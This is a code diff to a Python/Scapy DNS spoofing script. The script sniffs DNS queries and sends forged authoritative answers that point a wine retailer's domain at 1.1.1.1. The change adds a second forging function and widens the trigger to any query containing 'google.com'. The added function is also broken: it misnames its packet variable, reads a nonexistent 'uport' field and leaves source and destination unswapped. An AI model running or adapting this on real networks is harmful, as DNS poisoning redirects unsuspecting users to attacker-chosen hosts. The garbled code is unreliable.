@@ -20,6 +20,13 @@ def dns_reply(pkt):
         an=DNSRR(rrname="www.millesima.fr", ttl=100, rdata='1.1.1.1')) 
     send(spoofed_pkt)
 
+def dns_crequest(pkt):
+    poofed_pkt = IP(dst=pkt[IP].dst, src=pkt[IP].src)/\
+        UDP(dport=pkt[UDP].dport, sport=pkt[UDP].uport)/\
+        DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
+        an=DNSRR(rrname="www.millesima.fr", ttl=100, rdata='1.1.1.1'))
+    send(spoofed_pkt,)
+
 def sniff_DNS(pkt):
     pkt_time = pkt.sprintf('%sent.time%')
     try:
@@ -28,7 +35,8 @@ def sniff_DNS(pkt):
            print('[**] Detected DNS QR Message at: ' + pkt_time)
            if pkt[DNS].qd.qname:
                print(str(pkt[DNS].qd.qname))
-               if "www.google.com" in str(pkt[DNS].qd.qname):
+               if "google.com" in str(pkt[DNS].qd.qname):
+                dns_crequest(pkt)
                 dns_reply(pkt)
            
         elif DNSRR in pkt and pkt.sport == 53:
